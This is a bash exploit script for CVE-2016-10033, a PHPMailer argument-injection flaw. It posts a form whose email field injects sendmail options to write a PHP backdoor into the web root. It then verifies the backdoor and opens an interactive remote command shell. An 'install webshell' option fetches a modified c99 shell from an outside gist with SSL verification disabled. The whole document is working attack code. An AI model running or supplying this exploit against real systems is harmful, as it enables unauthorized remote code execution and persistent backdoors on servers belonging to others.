#!/bin/bash
# CVE-2016-10033 exploit by opsxcq
# https://github.com/opsxcq/exploit-CVE-2016-10033

echo '[+] CVE-2016-10033 exploit by opsxcq'

if [ -z "$1" ]
then
    echo '[-] Please inform an host as parameter'
    exit -1
fi

if [ $(uname) == 'Darwin' ]
then
    decoder='base64 -D'
    encoder='base64 -b0'
elif [ $(uname) == 'Linux' ]
then
    decoder='base64 -d'
    encoder='base64 -w0'
else
    echo '[-] Your platform isnt supported: '$(uname)
    exit -1
fi


host=$1

read -n 1 -p "Press any key to launch exploit against $host: " c

echo '[+] Exploiting '$host

curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n<?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?>\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vulnerables\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\" @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'


echo '[+] Checking if the backdoor was created on target system'
code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")

if [ "$code" != "200" ]
then
    echo '[-] Target cant be exploited'
    exit -1
else
    echo '[+] Backdoor.php found on remote system'
fi

echo '[+] Tidying backdoor script to only run everything once'
cmd="awk '/\<\?php/{c++;if(c>1){sub(\"<?php\",\"<?ignored-php\")}}1' < /www/backdoor.php > /www/backdoor.php.new && mv /www/backdoor.php.new /www/backdoor.php"
if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | $encoder | sed -e 's/+/%2b/g' | sed -e 's/\//%2f/g') | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder
then
    echo '[-] Connection problens'
    exit -1
fi

echo '[+] Type commands to run on remote host. Type "install webshell" to install webshell'
INSTALL_WEBSHELL_CMD="php -r 'file_put_contents(\"s.php\",file_get_contents(\"https://gist.githubusercontent.com/mstemm/02b77c530140fd8b6ea1151817c3ae01/raw/fbb00e911b4c719bfc5c2b11c4ac9b940f0402b8/c99shell%2520modified\",false,stream_context_create(array(\"ssl\"=>array(\"verify_peer\"=>false,\"verify_peer_name\"=>false,)))));'"
cmd=''
while [ "$cmd" != 'exit' ]
do
    if [[ "$cmd" == "install webshell" ]]; then
	echo "[+] Installing webshell"
	cmd=$INSTALL_WEBSHELL_CMD
    fi
    if [[ ! -z "${cmd// }" ]]; then
	echo '[+] Running '$cmd
	if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | $encoder | sed -e 's/+/%2b/g' | sed -e 's/\//%2f/g') | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder
	then
            echo '[-] Connection problens'
            exit -1
	fi
	echo
    fi
    read -p 'RemoteShell> ' cmd
done
echo '[+] Exiting'
